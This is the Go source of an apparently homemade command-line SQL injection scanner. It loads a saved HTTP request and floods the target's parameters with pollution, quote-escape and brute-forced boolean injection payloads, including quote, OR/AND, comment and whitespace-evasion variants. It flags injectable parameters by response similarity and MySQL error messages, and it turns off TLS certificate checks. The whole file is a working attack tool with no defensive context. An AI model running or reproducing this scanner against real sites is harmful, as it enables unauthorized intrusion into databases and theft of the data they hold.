package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"

	"github.com/adrg/strutil"
	"github.com/adrg/strutil/metrics"
)

var (
	// update error SQL first
	errors = []string{
		"Warning: mysql_fetch_array() expects",
		"You have an error in your SQL syntax",
		"Subquery returns more than 1 row",
	}
	specialSpace  = []string{"0a", "1a", "0b", "1b", "0c", "1c", "0d", "1d", "0e", "1e", "0f", "1f", "00", "10", "01", "11", "02", "12", "03", "13", "04", "14", "05", "15", "06", "16", "07", "17", "08", "18", "09", "19"}
	custom        = false
	errorBased    = false
	escapeSlash   = false
	escaper       []string
	needQuotes    = false
	paramEscape   []string
	letters       = []rune("0123456789")
	filename      string
	originDomain  string
	postBody      string
	hostname      string
	trueString    string
	falseString   string
	urlencode     = false
	headers       []string
	isSSL         = false
	scheme        = "http"
	originPath    = "/"
	contentType   string
	data          []string
	requestMethod = "GET"
	fullURL       string
	parameters    [][]string
	client        = &http.Client{Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	},
	}
	normalContent string
	normalHeader  string
	normalCode    int
)

func init() {
	if len(os.Args) == 1 {
		help()
	}
	for i, args := range os.Args {
		if args == "-r" {
			filename = os.Args[i+1]
			if fileExists(filename) {
				data = splitRequest(readFile(filename))
			} else {
				fmt.Println("Error: File " + filename + " does not exists!")
				os.Exit(0)
			}
		} else if args == "-ssl" {
			isSSL = true
		} else if args == "-hostname" {
			hostname = os.Args[i+1]
		} else if args == "-custom" {
			custom = true
		} else if args == "-true" {
			trueString = os.Args[i+1]
		} else if args == "-urlencode" {
			urlencode = true
		} else if args == "-escape" {
			escapeSlash = true
		}
	}
	getRequestInfo(data)
	getNormalResponse()
	fullURL = scheme + "://" + originDomain + originPath
	parameters = parsingParameter(originPath)
	fmt.Println("Target: " + fullURL)
}

func help() {
	fmt.Println("Usage: " + os.Args[0] + " [OPTIONS]")
	fmt.Println("    -r          Filename")
	fmt.Println("    -ssl        Force using SSL")
	fmt.Println("    -hostname   Custom hostname")
	fmt.Println("    -custom     Using custom injection ($INJECT$)")
	fmt.Println("    -true       String identifier for true result")
	fmt.Println("    -h          Show this help")
	os.Exit(0)
}

func main() {
	if custom {
		customInjection()
		os.Exit(0)
	}
	checkReflected()
	parameterPollution()
	checkParams()
	checkQueryEscaper()
	errorBasedBalancing()
}

func parameterPollution() {
	fmt.Println("[+] Parameter pollution - " + fullURL)
	for _, param := range parameters {
		pathExploit := strings.Replace(originPath, param[0], param[1]+"[]="+param[2], -1)
		content, _, _ := httpRequest(data, hostname, pathExploit, "")
		similarity := checkSimilarity(content)
		if similarity < 0.8 {
			fmt.Println("    " + param[1] + "[]=" + param[2] + " -> " + fmt.Sprintf("%f", similarity))
		}
		res, str := containsError(content)
		if res {
			fmt.Println("    " + param[1] + "[]=" + param[2] + " -> Contains Error: " + str)
		}
	}
}

func checkReflected() {
	fmt.Println("[+] Check Reflected String - " + fullURL)
	random := randomString(16)
	for _, param := range parameters {
		pathExploit := strings.Replace(originPath, param[0], param[1]+"="+random, -1)
		content, _, _ := httpRequest(data, hostname, pathExploit, "")
		if strings.Contains(content, random) {
			fmt.Println("    Reflected: True")
		}
		res, str := containsError(content)
		if res {
			fmt.Println("    Contains Error: " + str)
		}
	}
}

func randomString(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func checkParams() {
	fmt.Println("[+] Check Parameters - " + fullURL)
	for _, param := range parameters {
		_, err := strconv.Atoi(param[2])

		if err == nil {
			payload := strings.Repeat("A", len(param[2]))
			pathExploit := strings.Replace(originPath, param[0], param[1]+"="+payload, -1)
			content, _, _ := httpRequest(data, hostname, pathExploit, "")
			similarityAlpha := checkSimilarity(content)
			fmt.Println("    Alpha: " + param[1] + "=" + payload + " -> " + fmt.Sprintf("%f", similarityAlpha))
			payload = strings.Repeat("%20", len(param[2]))
			pathExploit = strings.Replace(originPath, param[0], param[1]+"="+payload, -1)
			content, _, _ = httpRequest(data, hostname, pathExploit, "")
			similarityNumeric := checkSimilarity(content)
			fmt.Println("    Numeric: " + param[1] + "=" + payload + " -> " + fmt.Sprintf("%f", similarityNumeric))
			if similarityAlpha == similarityNumeric {
				fmt.Println("    Result: No quotes needed!")
			}
			res, str := containsError(content)
			if res {
				fmt.Println("    " + param[1] + "=" + payload + " -> Contains Error: " + str)
			}
		}
	}
}

func customInjection() {
	fmt.Println("[+] Custom Injection -> " + fullURL)
	// ') OR ('1'='1
	random := randomString(5)
	firstEscaper := []string{"", "'", "\"", "`"}
	close := []string{"", ")"}
	open := []string{"", "("}
	space1 := []string{" ", "\n", "\r", "/**/", "\t", "", ".", "-", "~"}
	comparison := []string{"oR", "/*!oR*/", "||", "AnD", "/*!AnD*/", "&&"}
	space2 := []string{" ", "\n", "\r", "/**/", "\t", "", "-", "~"}
	equal := []string{"=", "lIkE"}
	pathExploit := originPath
	var body, payload string
	for _, a := range firstEscaper {
		for _, f := range close {
			for _, g := range open {
				for _, b := range space1 {
					for _, c := range comparison {
						for _, d := range space2 {
							for _, e := range equal {
								if f != "" || g != "" {
									payload = a + f + b + c + d + g + a + random + a + e + a + random
								} else {
									payload = a + b + c + d + a + random + a + e + a + random
								}
								if urlencode {
									payload = url.QueryEscape(payload)
								}
								if escapeSlash {
									payload = strings.Replace(payload, "\n", "\\n", -1)
									payload = strings.Replace(payload, "\r", "\\r", -1)
									payload = strings.Replace(payload, "\t", "\\t", -1)
								}
								if strings.Contains(originPath, "$INJECT$") {
									pathExploit = strings.Replace(originPath, "$INJECT$", payload, -1)
								}
								if requestMethod == "POST" {
									body = strings.Replace(postBody, "$INJECT$", payload, -1)
								}
								content, _, _ := httpRequest(data, hostname, pathExploit, body)
								if strings.Contains(content, trueString) {
									fmt.Println("    [VULN] " + cleanPrint(payload))
								}
							}
						}
					}
				}
			}
		}
	}
}

func errorBasedBalancing() {
	random := randomString(5)
	payloadEncoded := ""
	firstEscaper := []string{"", "'", "\"", "`"}
	space1 := []string{" ", "\n", "\r", "/**/", "\t", ""}
	comparison := []string{"oR", "/*!oR*/", "||", "AnD", "/*!AnD*/", "&&"}
	space2 := []string{" ", "\n", "\r", "/**/", "\t", ""}
	equal := []string{"=", "lIkE"}

	for _, a := range firstEscaper {
		for _, b := range space1 {
			for _, c := range comparison {
				for _, d := range space2 {
					for _, e := range equal {
						if needQuotes && a != "" {
							payload := a + b + c + d + a + random + a + e + a + random
							for _, param := range parameters {
								if inArray(paramEscape, param[1]) && inArray(escaper, a) {
									if requestMethod == "GET" {
										payloadEncoded = url.QueryEscape(payload)
									}
									pathExploit := strings.Replace(originPath, param[0], param[1]+"="+param[2]+payloadEncoded, -1)
									content, _, _ := httpRequest(data, hostname, pathExploit, "")
									similarity := checkSimilarity(content)
									res, _ := containsError(content)
									if !res && similarity > 0.8 {
										fmt.Println("    [VULN] " + param[1] + " -> " + param[2] + cleanPrint(payload))
									}
								}
							}
						}
					}
				}
			}
		}
	}
}

func cleanPrint(text string) string {
	text = strings.Replace(text, "\n", "[BSLACKN]", -1)
	text = strings.Replace(text, "\r", "[NSLASHR]", -1)
	text = strings.Replace(text, "\t", "[NSLASHT]", -1)
	return text
}

func inArray(stack []string, needle string) bool {
	for _, s := range stack {
		if s == needle {
			return true
		}
	}
	return false
}

func checkQueryEscaper() {
	fmt.Println("[+] Check Query Escaper - " + fullURL)
	chars := strings.Split("'\"\\`", "")
	numOfError := 0
	for _, param := range parameters {
		for i := range chars {
			pathExploit := strings.Replace(originPath, param[0], param[1]+"="+param[2]+chars[i], -1)
			content, _, _ := httpRequest(data, hostname, pathExploit, "")
			similarity := checkSimilarity(content)
			if similarity < 0.8 {
				numOfError++
				fmt.Println("    " + param[2] + chars[i] + " -> " + fmt.Sprintf("%f", similarity))
			}
			res, str := containsError(content)
			if res {
				paramEscape = append(paramEscape, param[1])
				escaper = append(escaper, chars[i])
				fmt.Println("    " + param[1] + "=" + param[2] + chars[i] + " -> Contains Error: " + str)
			}
		}
	}
	if numOfError > 2 {
		fmt.Println("    Possibility: Integer Injection or false positive!")
	} else {
		needQuotes = true
		fmt.Println("    Possibility: String Injection. Use the symbol to escape the query!")
	}
}

func findBadChars() {
	fmt.Println("[+] Find Bad Chars - " + fullURL)
	chars := strings.Split("0123456789ABCDEF", "")
	for _, param := range parameters {
		for i := range chars {
			for o := range chars {
				pathExploit := strings.Replace(originPath, param[0], param[1]+"="+param[2]+"%"+chars[i]+chars[o], -1)
				content, _, _ := httpRequest(data, hostname, pathExploit, "")
				similarity := checkSimilarity(content)
				if similarity < 0.8 {
					fmt.Println("    " + param[2] + "%" + chars[i] + chars[o] + " -> " + fmt.Sprintf("%f", similarity))
				}
			}
		}
	}
}

func getNormalResponse() {
	normalContent, normalHeader, normalCode = httpRequest(data, hostname, strings.Replace(originPath, "$INJECT$", "", -1), "")
	for _, err := range errors {
		if strings.Contains(normalContent, err) {
			fmt.Println("[!] Response contains error SQL: " + err)
		}
	}
}

func containsError(body string) (bool, string) {
	var err string
	for _, err = range errors {
		if strings.Contains(body, err) {
			errorBased = true
			return true, err
		}
	}
	return false, err
}

func checkSimilarity(content string) float64 {
	return strutil.Similarity(content, normalContent, metrics.NewLevenshtein())
}

func getRequestInfo(data []string) {
	dats := strings.Split(data[0], " ")
	requestMethod = dats[0]
	originPath = dats[1]

	for _, head := range data {
		header := strings.Split(head, ": ")
		if header[0] == "Host" {
			originDomain = header[1]
		} else if strings.Contains(head, "Content-Type: ") {
			contentType = strings.Replace(head, "Content-Type: ", "", -1)
		} else {
			headers = append(headers, head)
		}
	}
}

func parsingParameter(path string) [][]string {
	r, err := regexp.Compile(`([a-zA-Z_0-9%]+)=([a-zA-Z_0-9%]+)`)
	if err != nil {
		panic(err)
	}
	return r.FindAllStringSubmatch(path, -1)
}

func httpRequest(data []string, hostname string, path string, post string) (string, string, int) {
	if isSSL {
		scheme = "https"
	}
	var body io.Reader
	if postBody != "" {
		body = strings.NewReader(post)
	}
	req, err := http.NewRequest(requestMethod, scheme+"://"+originDomain+path, body)
	if err != nil {
		fmt.Println(err.Error())
		return "", "", 0
	}
	for _, head := range headers {
		if strings.Contains(head, ": ") {
			if strings.Contains(head, "Host") {
				if hostname != "" {
					req.Host = hostname
				}
			} else if !strings.Contains(head, "Accept-Encoding") {
				headerSplit := strings.Split(head, ": ")
				req.Header.Add(headerSplit[0], headerSplit[1])
			}
		}
	}
	if requestMethod == "POST" && contentType != "" {
		req.Header.Add("Content-Type", contentType)
	}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err.Error())
		return "", "", 0
	}
	defer resp.Body.Close()
	r, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err.Error())
		return "", "", 0
	}
	length := len(string(r))
	respHeader := respHeaderToString(resp, length)
	return string(r), respHeader, resp.StatusCode
}

func respHeaderToString(resp *http.Response, length int) string {
	respHeader := ""
	for k, v := range resp.Header {
		respHeader += k + ": " + strings.Join(v, "; ") + "\n"
	}
	redirect, err := resp.Location()
	if err == nil {
		respHeader += "Location: " + redirect.String() + "\n"
	}
	respHeader += "Content-Length: " + strconv.Itoa(length) + "\n"
	if len(resp.Cookies()) != 0 {
		//fmt.Println(resp.Cookies())
	}
	return respHeader + "\n"
}

func splitRequest(data string) []string {
	datas := strings.Replace(data, "\r", "", -1)
	splitted := strings.Split(datas, "\n\n")
	postBody = splitted[1]
	return strings.Split(splitted[0], "\n")
}

func readFile(filename string) string {
	dat, err := ioutil.ReadFile(filename)
	if err != nil {
		fmt.Println("[ERROR] File " + filename + " was not found!")
		os.Exit(1)
	}
	return string(dat)
}

func fileExists(filename string) bool {
	info, err := os.Stat(filename)
	if os.IsNotExist(err) {
		return false
	}
	return !info.IsDir()
}
